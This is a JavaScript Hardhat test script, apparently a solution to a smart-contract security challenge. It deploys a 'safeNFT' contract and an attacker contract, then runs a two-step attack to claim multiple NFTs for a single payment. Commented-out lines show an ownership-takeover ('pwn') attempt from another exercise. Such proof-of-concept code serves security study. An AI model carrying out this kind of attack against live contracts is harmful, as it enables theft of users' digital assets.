const { expect } = require("chai");
const { ethers, provider } = require("hardhat")

describe("safeNFT contract", function () {
  it("Deploy safeNFT contract, attacker contract and claim multiple NFTs", async function () {
    const [owner, attacker] = await ethers.getSigners();

    const baseContract = await ethers.getContractFactory("safeNFT");
    const hhBaseContract = await baseContract.deploy("safeNFT", "sNFT", ethers.utils.parseEther("0.01"));
	await hhBaseContract.deployed()
	
	const attackerContract = await ethers.getContractFactory("AttackContract");
	const hhAttackerContract = await attackerContract.connect(attacker).deploy(hhBaseContract.address);
	await hhAttackerContract.deployed()
	
	await hhAttackerContract.connect(attacker).attackStepOne({ value: ethers.utils.parseEther("0.01") })
	
	result = await hhBaseContract.canClaim(hhAttackerContract.address)
	console.log("Attacker can claim? ", result)
	
	await hhAttackerContract.connect(attacker).attackStepTwo()
	result = await hhBaseContract.connect(attacker).balanceOf(attacker.address)
	console.log("Attacker NFT Balance: ", result)
	
	result = await hhBaseContract.canClaim(hhAttackerContract.address)
	console.log("Attacker can claim? ", result)
	
	// await hardhatContract.connect(attacker).addToWhitelist(attacker.address);
	// await hardhatContract.connect(attacker).changeOwner(attacker.address);
	//
	// let result = await hardhatContract.connect(attacker).isOwner()
	// expect(result).to.equal(true)
	//
	// await hardhatContract.connect(attacker)["pwn(address)"](attacker.address);
	// result = await hardhatContract.isHacked()
	// expect(result).to.equal(true)
  });
});